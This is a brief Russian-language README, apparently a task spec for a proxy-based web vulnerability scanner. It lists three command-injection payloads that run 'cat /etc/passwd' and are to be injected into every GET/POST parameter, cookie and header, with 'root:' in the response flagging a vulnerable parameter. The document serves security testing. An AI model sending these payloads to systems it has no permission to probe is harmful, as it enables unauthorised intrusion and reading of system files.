# Proxy_Scanner_VK

---

### Вариант 1. 
Command injection – во все GET/POST/Сookie/HTTP заголовки попробовать подставить по очереди:
```
;cat /etc/passwd;
|cat /etc/passwd|
`cat /etc/passwd`
```
В ответе искать результат выполнения команды (строчку "root:"), если нашелся, писать, что данный GET/POST параметр уязвим
